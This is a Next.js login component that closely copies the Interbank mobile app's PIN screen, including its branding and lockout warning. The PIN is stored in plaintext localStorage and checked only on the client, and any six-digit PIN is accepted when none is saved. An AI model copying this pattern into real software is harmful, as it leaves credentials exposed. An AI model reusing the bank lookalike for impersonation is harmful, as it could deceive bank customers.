"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";

export default function LoginPinView() {
  const router = useRouter();

  const [userName, setUserName] = useState("Usuario");
  const [pin, setPin] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isErrorModalOpen, setIsErrorModalOpen] = useState(false);
  const [isLoadingSuccess, setIsLoadingSuccess] = useState(false);

  useEffect(() => {
    if (typeof window !== "undefined") {
      const savedName = localStorage.getItem("ibk_user_name") || "Usuario";
      const firstName = savedName.trim().split(" ")[0] || "Usuario";
      setUserName(firstName);
    }
  }, []);

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const cleanValue = e.target.value.replace(/[^0-9]/g, "").slice(0, 6);
    setPin(cleanValue);
  };

  const handleIngresar = () => {
    if (pin.length !== 6) return;

    const pinGuardado = localStorage.getItem("ibk_security_pin");

    if (pinGuardado && pinGuardado !== pin) {
      setIsErrorModalOpen(true);
    } else {
      setIsLoadingSuccess(true);
      setTimeout(() => {
        localStorage.setItem("sesion_iniciada", "true");
        router.push("/inicio");
      }, 2000);
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      e.preventDefault();
      handleIngresar();
    }
  };

  const closeErrorModal = () => {
    setIsErrorModalOpen(false);
    setPin("");
  };

  const isButtonEnabled = pin.length === 6;

  return (
    <div className="flex flex-col min-h-screen bg-[#00B14F] text-[#333333] relative overflow-hidden select-none">
      {/* ==================================================
          ZONA SUPERIOR VERDE
          ================================================== */}
      <div className="flex-1 flex flex-col items-center relative pt-4 pb-6 px-4">
        {/* Barra Superior */}
        <div className="flex justify-between items-center w-full px-2 mb-3">
          <button
            type="button"
            className="bg-[#038A36] rounded-full w-[38px] height-[38px] h-[38px] flex items-center justify-center text-white text-[17px] active:scale-95 transition"
          >
            <i className="fa-solid fa-bars"></i>
          </button>

          <img
            src="/img/logo.svg"
            alt="Interbank"
            className="h-[52px] object-contain drop-shadow-sm"
          />

          <button
            type="button"
            className="text-white text-[12px] p-0 flex items-center justify-center"
          >
            <i className="fa-solid fa-lock border-[1.5px] border-white p-[5px_6px] rounded-[6px]"></i>
          </button>
        </div>

        {/* Saludo */}
        <div className="text-white text-[22px] font-normal tracking-wide mt-2">
          Hola, <strong className="font-extrabold">{userName}</strong>
        </div>

        {/* QR Grande */}
        <div className="bg-white p-[10px] rounded-[14px] w-[180px] h-[180px] flex items-center justify-center mt-5 shadow-[0_4px_15px_rgba(0,0,0,0.12)]">
          <img
            src="/img/qr.png"
            alt="Mi QR"
            className="w-full h-full object-contain rounded-lg brightness-0"
          />
        </div>

        {/* Banner WhatsApp */}
        <div className="bg-[#005E1F] w-[90%] max-w-[340px] rounded-full py-[11px] px-5 flex items-center justify-between mt-6 text-white text-[12px] font-semibold shadow-sm">
          <img
            src="/img/whatsapp1.png"
            alt="WhatsApp"
            className="w-6 h-6 object-contain"
          />
          <span className="text-center px-1">
            ¡Plinea por WhatsApp sin abrir tu APP!
          </span>
          <i className="fa-solid fa-arrow-right text-[14px]"></i>
        </div>
      </div>

      {/* ==================================================
          ZONA BLANCA INFERIOR
          ================================================== */}
      <div className="bg-white rounded-t-[28px] p-[30px_24px_50px_24px] flex flex-col gap-4 shadow-lg z-10">
        {/* Input PIN */}
        <div className="flex items-center border border-[#e0e4e8] rounded-[14px] px-4 h-[55px] bg-white focus-within:border-[#0039A6] transition">
          <input
            type="tel"
            inputMode="numeric"
            value={pin}
            onChange={handlePinChange}
            onKeyDown={handleKeyDown}
            placeholder="Ingresa tu contraseña"
            maxLength={6}
            autoComplete="off"
            spellCheck="false"
            className={`border-none bg-transparent flex-1 text-[16px] text-[#333333] tracking-[3px] h-full outline-none placeholder:tracking-normal placeholder:text-[#aaa] placeholder:font-medium ${
              showPassword ? "unmasked-input" : "masked-input"
            }`}
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="p-1 focus:outline-none"
          >
            <img
              src={showPassword ? "/img/open-eye.svg" : "/img/close-eye.svg"}
              alt="Toggle Password"
              className="w-6 h-6 object-contain cursor-pointer opacity-80 hover:opacity-100 transition"
            />
          </button>
        </div>

        {/* Botón Ingresar */}
        <button
          type="button"
          onClick={handleIngresar}
          disabled={!isButtonEnabled}
          className={`w-full rounded-full py-4 text-[16px] font-bold text-white transition active:scale-[0.99] ${
            isButtonEnabled
              ? "bg-[#0039A6] shadow-[0_4px_12px_rgba(0,57,166,0.25)] hover:brightness-105 cursor-pointer"
              : "bg-[#A0B2D8] cursor-not-allowed"
          }`}
        >
          Ingresar
        </button>

        {/* Botón Huella Digital */}
        <button
          type="button"
          className="w-full bg-transparent text-[#0039A6] border-2 border-[#0039A6] rounded-full py-[13px] text-[15px] font-bold flex items-center justify-center gap-2 hover:bg-[#f0f4f8] active:bg-[#e4ebf3] transition"
        >
          <i className="fa-solid fa-fingerprint text-[18px]"></i>
          Ingresar con huella digital
        </button>

        {/* Links y Versión */}
        <div className="flex flex-col items-center mt-2 gap-3 text-center">
          <a
            href="#"
            className="text-[#333333] font-bold text-[14px] hover:underline"
          >
            Olvidé mi contraseña
          </a>
          <span className="text-[#a0a0a0] text-[11px] font-semibold">
            v23.0.1
          </span>
        </div>
      </div>

      {/* ==================================================
          MODAL DE ERROR (BOTTOM SHEET)
          ================================================== */}
      {isErrorModalOpen && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-[2px] z-[9999] flex flex-col justify-end">
          <div className="bg-white rounded-t-[24px] p-[30px_25px_30px_25px] w-full flex flex-col items-center text-center animate-slideUp">
            <img
              src="/img/cono.webp"
              alt="Error"
              className="w-[70px] h-[70px] object-contain mb-5"
            />
            <div className="text-[#00B14F] text-[18px] font-extrabold mb-2">
              Los datos son incorrectos
            </div>
            <div className="text-[#444444] text-[14px] leading-relaxed mb-6 max-w-[320px]">
              Recuerda que el tercer intento erróneo bloqueará el acceso a tus
              Interbank APP y Banca por Internet.
            </div>
            <button
              type="button"
              onClick={closeErrorModal}
              className="bg-[#0039A6] text-white w-full py-4 rounded-full text-[16px] font-bold hover:brightness-105 active:scale-[0.99] transition cursor-pointer"
            >
              Entendido
            </button>
          </div>
        </div>
      )}

      {/* ==================================================
          PANTALLA DE CARGA (BLUR DE ÉXITO)
          ================================================== */}
      {isLoadingSuccess && (
        <div className="fixed inset-0 bg-white/40 backdrop-blur-md z-[10000] flex justify-center items-center">
          <div className="relative w-20 h-20 rounded-full bg-white flex justify-center items-center shadow-[0_4px_15px_rgba(0,0,0,0.15)]">
            <div className="absolute -inset-1 rounded-full border-4 border-[#E5E5E5] border-t-[#00B14F] border-l-[#00B14F] animate-spinLoader"></div>
            <img
              src="/img/icon.webp"
              alt="Cargando"
              className="w-10 h-10 object-contain rounded-lg z-10"
            />
          </div>
        </div>
      )}
    </div>
  );
}
